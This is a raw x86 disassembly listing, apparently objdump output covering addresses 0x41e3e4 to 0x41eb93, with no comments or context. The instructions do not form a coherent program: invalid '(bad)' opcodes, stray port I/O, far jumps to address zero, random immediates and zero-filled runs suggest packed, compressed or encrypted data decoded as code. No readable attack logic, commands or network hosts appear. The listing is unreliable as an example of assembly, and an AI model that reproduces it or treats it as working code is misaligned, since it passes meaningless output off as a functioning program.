  41e3e4:	popa   
  41e3e5:	rcr    bh,cl
  41e3e7:	jmp    0x60b5e6f7
  41e3ec:	sbb    eax,0x4c129f40
  41e3f1:	lds    esi,FWORD PTR [edx+esi*8-0x74fad8cf]
  41e3f8:	enter  0x9705,0x6e
  41e3fc:	je     0x41e428
  41e3fe:	xor    al,0x6f
  41e400:	cmp    BYTE PTR [eax+0x3d],cl
  41e403:	or     al,0xac
  41e405:	std    
  41e406:	in     eax,dx
  41e407:	mov    DWORD PTR [edi],0xc45c6c0f
  41e40d:	jnp    0x41e3c1
	...
  41e41b:	int    0x2d
  41e41d:	xchg   ebp,eax
  41e41e:	inc    ebx
  41e41f:	cmc    
  41e420:	sti    
  41e421:	fild   QWORD PTR [edi-0x5bdf5fa9]
  41e427:	inc    edi
  41e428:	sub    eax,0xa13b0546
  41e42d:	add    DWORD PTR [eax],eax
  41e42f:	lods   al,BYTE PTR ds:[esi]
  41e430:	add    BYTE PTR [eax],al
  41e432:	add    al,ch
  41e434:	enter  0x51a5,0x2
  41e438:	lahf   
  41e439:	inc    edx
  41e43a:	mov    dh,0xc
  41e43c:	inc    ebx
  41e43d:	pop    es
  41e43e:	test   eax,0x7267f29c
  41e443:	inc    ecx
  41e444:	aas    
  41e445:	pop    edi
  41e446:	add    eax,DWORD PTR [ecx+eax*4]
  41e449:	and    ecx,DWORD PTR [edi+0x45bd1947]
  41e44f:	arpl   WORD PTR [ecx+edx*2],sp
  41e452:	sbb    BYTE PTR [ebp+0x27ae79a8],bh
  41e458:	lahf   
  41e459:	das    
  41e45a:	mov    esp,0x7c851c03
  41e45f:	push   edi
  41e460:	cld    
  41e461:	dec    ebx
  41e462:	scas   eax,DWORD PTR es:[edi]
  41e463:	dec    esp
  41e464:	imul   ebx,DWORD PTR [edx+0x6b],0xf15e8fee
  41e46b:	cmp    cl,BYTE PTR [eax+0x4bb6f8af]
  41e471:	int3   
  41e472:	push   edx
  41e473:	(bad)  
  41e474:	in     al,0xff
  41e476:	and    al,BYTE PTR [edi]
  41e478:	pushf  
  41e479:	addr16 adc al,0x42
  41e47c:	hlt    
  41e47d:	imul   esi,DWORD PTR ds:0x46942c1e,0x1142472d
  41e487:	adc    al,0x53
  41e489:	ret    0x504d
  41e48c:	xchg   esp,eax
  41e48d:	(bad)  
  41e48e:	inc    ecx
  41e48f:	push   ebp
  41e490:	mov    ss,WORD PTR [eax-0x771809b1]
  41e496:	retf   0x5a42
  41e499:	pushf  
  41e49a:	or     al,0x84
  41e49c:	jno    0x41e470
  41e49e:	jl     0x41e440
  41e4a0:	out    0x45,eax
  41e4a2:	aas    
  41e4a3:	daa    
  41e4a4:	cmp    cl,bl
  41e4a6:	call   DWORD PTR [ecx-0xb]
  41e4a9:	jl     0x41e4a8
  41e4ab:	push   es
  41e4ac:	pusha  
  41e4ad:	dec    esi
  41e4ae:	sub    al,0x4a
  41e4b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4b1:	inc    ebx
  41e4b2:	inc    esi
  41e4b3:	(bad)
  41e4b7:	es sbb ebx,ecx
  41e4ba:	push   edx
  41e4bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4bc:	out    dx,al
  41e4bd:	jle    0x41e4f0
  41e4bf:	or     al,BYTE PTR [esi+0x7f6f84df]
  41e4c5:	icebp  
  41e4c6:	dec    ebx
  41e4c7:	rcr    BYTE PTR [esi],1
  41e4c9:	shl    DWORD PTR [esi-0x1f],cl
  41e4cc:	pop    es
  41e4cd:	fcomi  st,st(2)
  41e4cf:	es xchg ebp,eax
  41e4d1:	aam    0x59
  41e4d3:	sub    al,0x95
  41e4d5:	xchg   edi,eax
  41e4d6:	xchg   edi,eax
  41e4d7:	pop    es
  41e4d8:	mov    bl,BYTE PTR [edi-0x13]
  41e4db:	js     0x41e4d3
  41e4dd:	leave  
  41e4de:	jmp    0x0:0x0
  41e4e5:	add    BYTE PTR [eax],al
  41e4e7:	add    BYTE PTR [eax],al
  41e4e9:	add    BYTE PTR [eax],al
  41e4eb:	adc    esp,DWORD PTR [edi+eiz*8+0xb]
  41e4ef:	test   DWORD PTR [ebx-0xce58301],0x7444cfc
  41e4f9:	ret    0xe777
  41e4fc:	mov    eax,ds:0xac0001
  41e501:	add    BYTE PTR [eax],al
  41e503:	outs   dx,BYTE PTR ds:[esi]
  41e504:	xchg   esi,eax
  41e505:	ds repz mov dl,0x19
  41e509:	aaa    
  41e50a:	pop    esi
  41e50b:	js     0x41e516
  41e50d:	mov    ebx,0x59614506
  41e512:	sar    BYTE PTR [esi-0x3f],0xa0
  41e516:	sub    bh,ch
  41e518:	aaa    
  41e519:	lods   eax,DWORD PTR ds:[esi]
  41e51a:	sahf   
  41e51b:	add    DWORD PTR [esp+ebx*4-0x4b668562],ebx
  41e522:	sbb    DWORD PTR [esi+0x2d],edi
  41e525:	inc    edx
  41e526:	pop    ds
  41e527:	lods   eax,DWORD PTR ds:[esi]
  41e528:	jge    0x41e4ff
  41e52a:	dec    ebp
  41e52b:	jmp    0x41e51c
  41e52d:	aam    0x64
  41e52f:	mov    eax,ds:0x7cf8133a
  41e534:	jno    0x41e57b
  41e536:	and    DWORD PTR [ebp-0x462a7e47],0x101d6430
  41e540:	inc    ebx
  41e541:	push   eax
  41e542:	mov    bh,0x7a
  41e544:	lea    edx,[edx-0x1]
  41e547:	push   ebx
  41e548:	pop    eax
  41e549:	in     eax,0xdf
  41e54b:	enter  0xbe23,0xa5
  41e54f:	in     al,0x74
  41e551:	test   al,0x69
  41e553:	scas   eax,DWORD PTR es:[edi]
  41e554:	test   al,0x5b
  41e556:	and    ah,BYTE PTR [ebp-0x20]
  41e559:	popa   
  41e55a:	sub    ebp,DWORD PTR [edx+0xb]
  41e55d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e55e:	(bad)  
  41e55f:	in     al,dx
  41e560:	adc    BYTE PTR [edx],ch
  41e562:	je     0x41e512
  41e564:	cmp    BYTE PTR [eax],cl
  41e566:	sub    DWORD PTR [esi+0x7],ecx
  41e569:	inc    ecx
  41e56a:	aad    0x39
  41e56c:	or     eax,0x7a8baf51
  41e571:	xchg   ebx,eax
  41e572:	or     BYTE PTR [edi+0x686eba67],bh
  41e578:	in     al,0xc4
  41e57a:	xor    bl,BYTE PTR ds:0xad01078d
  41e580:	inc    eax
  41e581:	ins    BYTE PTR es:[edi],dx
  41e582:	sub    BYTE PTR [ecx+0x1211c4de],al
  41e588:	adc    ecx,0xf5d90af2
  41e58e:	inc    esp
  41e58f:	cmp    eax,0x8cc5df85
  41e594:	or     al,0x67
  41e596:	in     al,dx
  41e597:	shl    BYTE PTR [ecx+0x39],0xef
  41e59b:	pusha  
  41e59c:	hlt    
  41e59d:	inc    edx
  41e59e:	xor    al,0x6
  41e5a0:	jns    0x41e56b
  41e5a2:	sbb    al,0xd8
  41e5a4:	stc    
  41e5a5:	(bad)  
  41e5a6:	or     DWORD PTR [eax],0x35353620
  41e5ac:	fcom   QWORD PTR [edx-0x67]
	...
  41e5bb:	daa    
  41e5bc:	push   ecx
  41e5bd:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  41e5c7:	not    DWORD PTR [ebx-0x5d6cf0c0]
  41e5cd:	add    DWORD PTR [eax],eax
  41e5cf:	lods   al,BYTE PTR ds:[esi]
  41e5d0:	add    BYTE PTR [eax],al
  41e5d2:	add    BYTE PTR [esi+eax*1+0x17],cl
  41e5d6:	(bad)  
  41e5d8:	addr16 jg 0x41e651
  41e5db:	pop    es
  41e5dc:	xchg   esi,eax
  41e5dd:	xlat   BYTE PTR ds:[ebx]
  41e5de:	ret    0xaf95
  41e5e1:	retf   0x280b
  41e5e4:	loopne 0x41e5a2
  41e5e6:	mov    edi,ss
  41e5e8:	jno    0x41e644
  41e5ea:	in     al,0xf4
  41e5ec:	mov    ds:0xad99eeca,al
  41e5f1:	jecxz  0x41e5f6
  41e5f3:	repz mov al,0x4b
  41e5f6:	push   ebx
  41e5f7:	push   ecx
  41e5f8:	out    dx,al
  41e5f9:	test   eax,0xb63eb813
  41e5fe:	stos   BYTE PTR es:[edi],al
  41e5ff:	dec    edx
  41e600:	ss lahf 
  41e602:	out    dx,eax
  41e603:	inc    esp
  41e604:	sahf   
  41e605:	inc    ecx
  41e606:	nop
  41e607:	or     dl,BYTE PTR [ebp+ebx*4-0x36]
  41e60b:	sub    al,0x84
  41e60d:	popf   
  41e60e:	test   ah,ah
  41e610:	sub    al,BYTE PTR [ebp-0x71]
  41e613:	cmp    al,0x50
  41e615:	jp     0x41e659
  41e617:	popf   
  41e618:	lahf   
  41e619:	ret    0xb1c6
  41e61c:	clc    
  41e61d:	xor    DWORD PTR [edi-0x2f],ebp
  41e620:	(bad)  
  41e621:	pop    esi
  41e622:	sub    ch,BYTE PTR [ebp-0x17649056]
  41e628:	sbb    al,0x93
  41e62a:	pop    ebp
  41e62b:	fs mov bh,0xaa
  41e62e:	out    0x2c,eax
  41e630:	pushf  
  41e631:	ins    BYTE PTR es:[edi],dx
  41e632:	and    BYTE PTR [edi+0x66820a4a],dl
  41e638:	fcomp  QWORD PTR [esi-0x7830430d]
  41e63e:	pop    ds
  41e63f:	cmp    ebp,DWORD PTR [esi+0x75a5bbeb]
  41e645:	test   esi,ebp
  41e647:	or     eax,0xcf8e2b78
  41e64c:	sbb    dl,BYTE PTR [ebp-0x13c3b043]
  41e652:	sbb    al,0xd1
  41e654:	not    edi
  41e656:	fwait
  41e657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e658:	aas    
  41e659:	imul   eax,DWORD PTR gs:[edx],0x62371e
  41e660:	mov    ah,0x81
  41e662:	sbb    DWORD PTR [eax],0xbe9f5a04
  41e668:	dec    ch
  41e66a:	dec    esp
  41e66b:	or     al,0x4
  41e66d:	retf   0x4597
  41e670:	or     BYTE PTR [esi-0x21],0x4c
  41e674:	sbb    BYTE PTR [ebx-0x34],bh
  41e677:	dec    eax
  41e678:	sbb    eax,0x63b4d7e9
  41e67d:	arpl   bx,sp
	...
  41e68b:	add    dl,BYTE PTR ss:[ebp+0xc]
  41e68f:	jne    0x41e6f0
  41e691:	jg     0x41e6cd
  41e693:	clc    
  41e694:	cs aas 
  41e696:	push   0xc1c45756
  41e69b:	arpl   WORD PTR [edx+0xac0001],cx
  41e6a1:	add    BYTE PTR [eax],al
  41e6a3:	sub    ecx,DWORD PTR [ecx-0x13cf62]
  41e6a9:	retf   
  41e6aa:	inc    eax
  41e6ab:	jbe    0x41e6f6
  41e6ad:	popf   
  41e6ae:	mov    eax,ds:0x185b6203
  41e6b3:	mov    esi,0xe0d8d880
  41e6b8:	xlat   BYTE PTR ds:[ebx]
  41e6b9:	shl    BYTE PTR [ebx],1
  41e6bb:	mov    dl,0xba
  41e6bd:	inc    eax
  41e6be:	inc    edi
  41e6bf:	lock push cs
  41e6c1:	clc    
  41e6c2:	push   ebp
  41e6c3:	mov    DWORD PTR [edx],esi
  41e6c5:	ja     0x41e6b1
  41e6c7:	add    ebx,ebp
  41e6c9:	push   esi
  41e6ca:	imul   ebx,DWORD PTR [eax-0x4e],0xf3befcf8
  41e6d1:	jbe    0x41e67f
  41e6d3:	xlat   BYTE PTR ds:[ebx]
  41e6d4:	xchg   ebx,eax
  41e6d5:	mov    dh,0x63
  41e6d7:	xchg   ecx,eax
  41e6d8:	xor    eax,0xd58c1b21
  41e6dd:	stos   BYTE PTR es:[edi],al
  41e6de:	pop    ebp
  41e6df:	jbe    0x41e681
  41e6e1:	and    esi,DWORD PTR [edi]
  41e6e3:	es inc edi
  41e6e5:	pop    edx
  41e6e6:	mov    ah,0xdf
  41e6e8:	in     eax,dx
  41e6e9:	mov    edi,0x9481972
  41e6ee:	inc    edi
  41e6ef:	sub    al,0x2b
  41e6f1:	mov    edi,0x47cdca43
  41e6f6:	xor    al,0x65
  41e6f8:	ds push edi
  41e6fa:	or     bl,bl
  41e6fc:	test   DWORD PTR [ebx-0x27787f32],eax
  41e702:	pop    edi
  41e703:	outs   dx,BYTE PTR ds:[esi]
  41e704:	int3   
  41e705:	xor    al,0x61
  41e707:	aas    
  41e708:	mov    ch,0xe4
  41e70a:	xor    al,0x84
  41e70c:	pop    ds
  41e70d:	or     DWORD PTR [eax-0x71],esi
  41e710:	leave  
  41e711:	(bad)
  41e714:	xchg   edi,eax
  41e715:	push   es
  41e716:	jp     0x41e743
  41e718:	lods   eax,DWORD PTR ds:[esi]
  41e719:	cmp    bl,dl
  41e71b:	or     esp,esi
  41e71d:	lock fs xor al,0x62
  41e721:	or     ecx,DWORD PTR [esi]
  41e723:	and    ebp,DWORD PTR [ecx+0x2c161be5]
  41e729:	ret    0xbb2a
  41e72c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e72d:	imul   eax,DWORD PTR [eax],0xb94ed749
  41e733:	push   ebp
  41e734:	ret    
  41e735:	mov    eax,0xc4cbf7ed
  41e73a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e73b:	cwde   
  41e73c:	inc    ebx
  41e73d:	icebp  
  41e73e:	rcl    DWORD PTR [ebx+0x23990e6],1
  41e744:	mov    ?,WORD PTR [edi+0x40]
  41e747:	pop    esp
  41e748:	mov    esp,0x945ff7ac
  41e74d:	mul    BYTE PTR ds:0x0
	...
  41e75b:	or     BYTE PTR [ecx-0x404c48e],dh
  41e761:	dec    ecx
  41e762:	mov    bl,0x94
  41e764:	je     0x41e73d
  41e766:	call   0x8b0f:0x711a864
  41e76d:	add    DWORD PTR [eax],eax
  41e76f:	lods   al,BYTE PTR ds:[esi]
  41e770:	add    BYTE PTR [eax],al
  41e772:	add    BYTE PTR [edx+0x6a0c5852],dl
  41e778:	pusha  
  41e779:	call   edx
  41e77b:	push   ecx
  41e77c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e77d:	push   cs
  41e77e:	in     eax,0x9f
  41e780:	or     ecx,DWORD PTR [ebx]
  41e782:	sahf   
  41e783:	mov    gs,WORD PTR [ebx+0x64d9e2ac]
  41e789:	add    eax,0x7c00b461
  41e78e:	cdq    
  41e78f:	inc    esi
  41e790:	mov    ebp,0xa410cedc
  41e795:	jecxz  0x41e741
  41e797:	data16 arpl WORD PTR [eax-0x497869db],bx
  41e79e:	imul   edx,DWORD PTR [eax+edi*8-0x2ebca905],0xdf2f367a
  41e7a9:	jae    0x41e74b
  41e7ab:	out    0x74,eax
  41e7ad:	enter  0x909,0x7c
  41e7b1:	repnz fs aad 0x2e
  41e7b5:	mov    DWORD PTR ds:0x8997246c,0x35d2b4f4
  41e7bf:	cld    
  41e7c0:	or     ebx,esi
  41e7c2:	and    edx,ebx
  41e7c4:	imul   ebp,DWORD PTR [eax-0x5b],0x3f
  41e7c8:	sub    DWORD PTR [eax+0x4b4aeaa5],ecx
  41e7ce:	rcr    BYTE PTR [edi-0x64cf98f6],cl
  41e7d4:	jmp    DWORD PTR [ebx]
  41e7d6:	nop
  41e7d7:	dec    ebx
  41e7d8:	mov    dl,BYTE PTR [esi]
  41e7da:	fdivp  st(7),st
  41e7dc:	fsubr  st,st(3)
  41e7de:	(bad)  
  41e7df:	aas    
  41e7e0:	xor    al,0x49
  41e7e2:	loope  0x41e847
  41e7e4:	sbb    DWORD PTR [eiz*4+0x7153d4ad],esi
  41e7eb:	ret    
  41e7ec:	jp     0x41e7d2
  41e7ee:	(bad)  
  41e7ef:	push   0xffffff8a
  41e7f1:	sbb    DWORD PTR [ecx],0x59
  41e7f4:	fimul  WORD PTR [ecx+0x6e]
  41e7f7:	mov    ecx,cs
  41e7f9:	std    
  41e7fa:	ja     0x41e7ed
  41e7fc:	sbb    al,al
  41e7fe:	data16 inc BYTE PTR [esi-0x2f]
  41e802:	ss ss add ebx,eax
  41e806:	(bad)  
  41e807:	in     al,dx
  41e808:	in     al,dx
  41e809:	stos   DWORD PTR es:[edi],eax
  41e80a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e80b:	je     0x41e7d2
  41e80d:	mov    bh,al
  41e80f:	jmp    0x41e7bc
  41e811:	mov    ah,BYTE PTR [edx+0x47aab904]
  41e817:	fbld   TBYTE PTR [eax-0x45eb8ae1]
  41e81d:	xor    al,0xfb
	...
  41e82b:	fist   WORD PTR [ebx-0x4e]
  41e82e:	dec    edi
  41e82f:	mov    esi,0x67d3ffef
  41e834:	xchg   ecx,edi
  41e836:	adc    al,0xe8
  41e838:	iret   
  41e839:	jg     0x41e884
  41e83b:	mov    ebx,0xac00018b
  41e840:	add    BYTE PTR [eax],al
  41e842:	add    BYTE PTR [edi+ebx*1+0x54],dl
  41e846:	in     eax,0xa1
  41e848:	rcr    BYTE PTR [eax+0x74],1
  41e84b:	mov    bl,0xc7
  41e84d:	pop    edi
  41e84e:	mov    ecx,0x70e92417
  41e853:	jae    0x41e7ff
  41e855:	pushf  
  41e856:	jecxz  0x41e87b
  41e858:	dec    ebx
  41e859:	mov    DWORD PTR [ebx+0x1273361e],edx
  41e85f:	pop    eax
  41e860:	test   al,0x7f
  41e862:	int    0x15
  41e864:	sub    ch,BYTE PTR [ebp-0xc]
  41e867:	push   esp
  41e868:	xchg   DWORD PTR [esi],ebx
  41e86a:	mov    cl,0x5d
  41e86c:	loopne 0x41e8c6
  41e86e:	sti    
  41e86f:	sbb    BYTE PTR [eax],dl
  41e871:	dec    esi
  41e872:	adc    bh,BYTE PTR [ecx+0x2a305308]
  41e878:	mov    ebp,0x3310b08d
  41e87d:	idiv   BYTE PTR [ecx+esi*8]
  41e880:	ja     0x41e8bd
  41e882:	jmp    0x41e867
  41e884:	inc    ebx
  41e885:	scas   al,BYTE PTR es:[edi]
  41e886:	adc    al,BYTE PTR [edx]
  41e888:	and    eax,0xb111e0f
  41e88d:	mov    bl,0xc9
  41e88f:	fidivr DWORD PTR [eax*8+0x5ee4860e]
  41e896:	pop    ss
  41e897:	xor    DWORD PTR ds:[ebx+ebp*8],eax
  41e89b:	xchg   esi,eax
  41e89c:	repnz bound esi,QWORD PTR [eax+0x714e870a]
  41e8a3:	mov    BYTE PTR [ecx],0xad
  41e8a6:	in     eax,0x89
  41e8a8:	mov    WORD PTR [ebx+0x40],ds
  41e8ab:	adc    al,0x38
  41e8ad:	jnp    0x41e8cb
  41e8af:	out    dx,eax
  41e8b0:	rcl    DWORD PTR [edx+0x57659b24],0x46
  41e8b7:	inc    esp
  41e8b8:	adc    DWORD PTR [eax+0xd],ebp
  41e8bb:	mov    ch,ah
  41e8bd:	out    dx,eax
  41e8be:	xor    BYTE PTR [edx+0xd773aa4],dh
  41e8c4:	jecxz  0x41e92b
  41e8c6:	or     BYTE PTR [edi-0x47],ah
  41e8c9:	jne    0x41e87b
  41e8cb:	push   esp
  41e8cc:	imul   ecx,DWORD PTR [eax],0xb45b8e22
  41e8d2:	jne    0x41e89e
  41e8d4:	xchg   BYTE PTR ds:[edx],al
  41e8d7:	div    BYTE PTR [ebp-0x71615510]
  41e8dd:	xlat   BYTE PTR ds:[ebx]
  41e8de:	enter  0xbd54,0xb4
  41e8e2:	jnp    0x41e91d
  41e8e4:	cs pop es
  41e8e6:	loopne 0x41e8b4
  41e8e8:	das    
  41e8e9:	sub    cl,BYTE PTR ds:0xa991a012
	...
  41e8fb:	xchg   DWORD PTR [ebx+edx*8],ecx
  41e8fe:	fcmovu st,st(3)
  41e900:	fisttp WORD PTR [edi+0x640ccb5d]
  41e906:	push   ss
  41e907:	pusha  
  41e908:	repnz imul edi,DWORD PTR [edi],0x67
  41e90c:	mov    WORD PTR [ecx],es
  41e90e:	add    BYTE PTR [eax+eax*1-0x1d610000],ch
  41e915:	icebp  
  41e916:	push   ecx
  41e917:	ret    
  41e918:	lods   al,BYTE PTR ds:[esi]
  41e919:	js     0x41e913
  41e91b:	std    
  41e91c:	mov    ds:0xe742bc5a,eax
  41e921:	xor    edi,DWORD PTR [esi+ebx*1-0x24d0617c]
  41e928:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41e92a:	dec    esp
  41e92b:	lahf   
  41e92c:	push   cs
  41e92d:	mov    ds:0x1661a5ce,eax
  41e932:	in     eax,0xe6
  41e934:	or     BYTE PTR [ebx+edi*2],bl
  41e937:	in     al,dx
  41e938:	xor    DWORD PTR [ecx+0xc],edi
  41e93b:	push   ss
  41e93c:	add    ebx,esp
  41e93e:	xchg   esp,eax
  41e93f:	iret   
  41e940:	fs pop ds
  41e942:	xchg   esp,eax
  41e943:	mov    WORD PTR [eax-0x7e],ds
  41e946:	mov    dh,0x87
  41e948:	xchg   ecx,eax
  41e949:	out    dx,al
  41e94a:	adc    edx,DWORD PTR [ebp+0x1e66e902]
  41e950:	pop    ebp
  41e951:	mov    al,ds:0xe3de85d3
  41e956:	popa   
  41e957:	lods   al,BYTE PTR ds:[esi]
  41e958:	inc    eax
  41e959:	(bad)  
  41e95a:	cld    
  41e95b:	in     eax,0xb0
  41e95d:	inc    ebx
  41e95e:	mov    edx,0xb2efec3
  41e963:	and    DWORD PTR gs:0xe35ddfef,ebp
  41e96a:	aas    
  41e96b:	(bad)  
  41e96c:	clc    
  41e96d:	(bad)  
  41e96e:	xor    BYTE PTR [ecx+eiz*4+0x46051759],al
  41e975:	sub    eax,0x403ee319
  41e97a:	pop    ds
  41e97b:	stos   BYTE PTR es:[edi],al
  41e97c:	cmp    eax,0xf9632b60
  41e981:	push   ecx
  41e982:	lea    eax,[ecx+0x40ccda02]
  41e988:	sbb    DWORD PTR [ebx-0x66],ecx
  41e98b:	jbe    0x41e965
  41e98d:	push   0xfffffff9
  41e98f:	ror    BYTE PTR [edx-0x1e],0x81
  41e993:	ins    DWORD PTR es:[edi],dx
  41e994:	jge    0x41e990
  41e996:	pop    ebx
  41e997:	jmp    0x41e9d9
  41e999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e99a:	inc    ecx
  41e99b:	ins    DWORD PTR es:[edi],dx
  41e99c:	test   DWORD PTR [ebp+0x17],esp
  41e99f:	(bad)  
  41e9a0:	inc    ebx
  41e9a1:	mov    edx,0x117d2812
  41e9a6:	fs mov ebx,0xd9b0fb89
  41e9ac:	out    0x5d,al
  41e9ae:	mov    ecx,0xf5da7619
  41e9b3:	dec    eax
  41e9b4:	adc    eax,0xac55a25f
  41e9b9:	js     0x41e94c
  41e9bb:	push   edx
  41e9bc:	imul   ecx,DWORD PTR [esi+0x64],0x0
	...
  41e9cb:	lahf   
  41e9cc:	arpl   WORD PTR [ebp+0x72],cx
  41e9cf:	std    
  41e9d0:	jle    0x41e991
  41e9d2:	out    dx,eax
  41e9d3:	sbb    edi,esp
  41e9d5:	mov    BYTE PTR [edx+ecx*1+0x1332d0ae],dh
  41e9dc:	lea    eax,[ecx]
  41e9de:	add    BYTE PTR [eax+eax*1-0x5f60000],ch
  41e9e5:	xchg   edi,eax
  41e9e6:	sub    esp,edi
  41e9e8:	jle    0x41ea27
  41e9ea:	xchg   ebx,eax
  41e9eb:	out    dx,al
  41e9ec:	mov    bh,0x6c
  41e9ee:	fcom   DWORD PTR [ebx-0x52]
  41e9f1:	push   ecx
  41e9f2:	jp     0x41ea24
  41e9f4:	in     eax,0x5c
  41e9f6:	int3   
  41e9f7:	hlt    
  41e9f8:	inc    ebx
  41e9f9:	lock in eax,0x94
  41e9fc:	mov    eax,ds:0xbbc11fe1
  41ea01:	loopne 0x41e9d2
  41ea03:	sub    DWORD PTR [eax],ebp
  41ea05:	add    BYTE PTR [eax],ch
  41ea07:	enter  0x14c,0x78
  41ea0b:	jmp    0xfa64fcea
  41ea10:	(bad)  
  41ea11:	dec    edi
  41ea12:	jns    0x41ea5e
  41ea14:	dec    esp
  41ea15:	xor    edx,esi
  41ea17:	jae    0x41e9d4
  41ea19:	loopne 0x41ea7b
  41ea1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea1c:	push   edx
  41ea1d:	jb     0x41ea30
  41ea1f:	adc    eax,0xd694a288
  41ea24:	push   es
  41ea25:	sbb    dh,BYTE PTR [ecx+0x5e]
  41ea28:	mov    BYTE PTR [edi+0x10],al
  41ea2b:	adc    ah,BYTE PTR [ebx+0x372645fa]
  41ea31:	cld    
  41ea32:	and    eax,0x4e6c051
  41ea37:	xchg   ebx,eax
  41ea38:	mov    ?,esp
  41ea3a:	xlat   BYTE PTR ds:[ebx]
  41ea3b:	push   edi
  41ea3c:	inc    ebp
  41ea3d:	inc    esi
  41ea3e:	retf   
  41ea3f:	mov    edx,0x882a1bf7
  41ea44:	sub    ah,BYTE PTR [esi-0x45]
  41ea47:	retf   
  41ea48:	(bad)
  41ea4c:	or     al,0xb0
  41ea4e:	retf   0x5894
  41ea51:	ret    
  41ea52:	loop   0x41e9f9
  41ea54:	xor    dl,BYTE PTR [esi-0x1572f48f]
  41ea5a:	pusha  
  41ea5b:	mov    DWORD PTR [esp+edi*2+0x661a4260],ebp
  41ea62:	mov    bh,0x2
  41ea64:	ss push ss
  41ea66:	daa    
  41ea67:	xchg   esi,esi
  41ea69:	mov    ecx,0xe2cc40c2
  41ea6e:	fistp  DWORD PTR [ecx+0x1e]
  41ea71:	out    dx,eax
  41ea72:	inc    DWORD PTR [ebx]
  41ea74:	xchg   ebp,eax
  41ea75:	pop    esp
  41ea76:	test   eax,0x187ce159
  41ea7b:	sbb    eax,ebp
  41ea7d:	sub    al,0x74
  41ea80:	sbb    edx,DWORD PTR [edi+0x37f21658]
  41ea86:	and    DWORD PTR [edi-0x79],ebp
  41ea89:	int    0xf
  41ea8b:	push   ecx
  41ea8c:	jecxz  0x41eabb
  41ea8e:	push   ds
	...
  41ea9b:	jo     0x41eac0
  41ea9d:	and    eax,0x7c6f7769
  41eaa2:	cmp    esp,DWORD PTR [eax+0x60bcee1c]
  41eaa8:	jg     0x41eadd
  41eaaa:	ja     0x41ea6b
  41eaac:	lea    eax,[ecx]
  41eaae:	add    BYTE PTR [eax+eax*1-0x2e50000],ch
  41eab5:	mov    WORD PTR [edi+0x8],?
  41eab8:	(bad)  
  41eab9:	out    0x67,eax
  41eabb:	pusha  
  41eabc:	push   eax
  41eabd:	inc    edx
  41eabe:	sub    cl,ch
  41eac0:	pusha  
  41eac1:	aam    0x26
  41eac3:	jge    0x41eacf
  41eac5:	dec    edi
  41eac6:	sub    DWORD PTR [ebx-0x24495a00],edi
  41eacc:	jle    0x41eac6
  41eace:	mov    bh,0x20
  41ead0:	sahf   
  41ead1:	aas    
  41ead2:	stos   BYTE PTR es:[edi],al
  41ead3:	mov    BYTE PTR ds:0xeb3e86d1,ch
  41ead9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eada:	inc    ebp
  41eadb:	dec    ebp
  41eadc:	add    BYTE PTR [edx-0x56],bl
  41eadf:	mov    ecx,0xa4f544dc
  41eae4:	and    BYTE PTR ds:0xb4aa3087,cl
  41eaea:	cs stos BYTE PTR es:[edi],al
  41eaec:	dec    esp
  41eaed:	pop    es
  41eaee:	lahf   
  41eaef:	lods   eax,DWORD PTR ds:[esi]
  41eaf0:	test   eax,0x16a8a197
  41eaf5:	maxps  xmm1,xmm3
  41eaf8:	lock push cs
  41eafa:	inc    ecx
  41eafb:	pcmpeqd mm4,QWORD PTR [ebp-0x2]
  41eaff:	xchg   edi,eax
  41eb00:	or     BYTE PTR [esi+0x59bce062],ah
  41eb06:	clc    
  41eb07:	jno    0x41eb12
  41eb09:	push   ecx
  41eb0a:	mov    ah,0xed
  41eb0c:	push   cs
  41eb0d:	pop    ebx
  41eb0e:	mov    eax,0xcda52b7
  41eb13:	fdivr  QWORD PTR [edi]
  41eb15:	outs   dx,DWORD PTR ds:[esi]
  41eb16:	sbb    ch,BYTE PTR ds:0x4d232ea8
  41eb1c:	daa    
  41eb1d:	xchg   ebx,eax
  41eb1e:	or     DWORD PTR [eax+0x50],ebp
  41eb21:	push   ds
  41eb22:	mov    ebp,0xb92de058
  41eb27:	repnz adc ebx,eax
  41eb2a:	out    0x99,al
  41eb2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb2d:	push   edx
  41eb2e:	jl     0x41eafb
  41eb30:	js     0x41eb0e
  41eb32:	xchg   ebp,eax
  41eb33:	lahf   
  41eb34:	ins    DWORD PTR es:[edi],dx
  41eb35:	cli    
  41eb36:	mov    ecx,es
  41eb38:	sbb    eax,0xafcdbf37
  41eb3d:	lock fisub WORD PTR [edi-0x38]
  41eb41:	jmp    0x92a68c44
  41eb46:	call   0x9937a67e
  41eb4b:	ja     0x41eb15
  41eb4d:	mov    ebp,0xedbe0e5f
  41eb52:	loope  0x41ebcc
  41eb54:	add    ebp,DWORD PTR [ebx-0x41dc1b6b]
  41eb5a:	retf   
  41eb5b:	int3   
  41eb5c:	pop    ecx
  41eb5d:	xchg   ebx,eax
  41eb5e:	imul   eax,DWORD PTR [eax],0x0
  41eb64:	add    BYTE PTR [eax],al
  41eb66:	add    BYTE PTR [eax],al
  41eb68:	add    BYTE PTR [eax],al
  41eb6a:	add    BYTE PTR [eax+edx*4-0x32223f23],dl
  41eb71:	popf   
  41eb72:	aam    0x57
  41eb74:	(bad)
  41eb78:	fcomp  QWORD PTR [edi+0x49]
  41eb7b:	imul   ecx,DWORD PTR [esi+0xac0001],0x0
  41eb82:	add    bl,ah
  41eb84:	jecxz  0x41eb7a
  41eb86:	xchg   ecx,eax
  41eb87:	jae    0x41ebfd
  41eb89:	fwait
  41eb8a:	int    0x7
  41eb8c:	scas   al,BYTE PTR es:[edi]
  41eb8d:	lods   al,BYTE PTR ds:[esi]
  41eb8e:	mov    ch,0x2b
  41eb90:	int    0x78
  41eb92:	stc    
  41eb93:	jge    0x41ebda
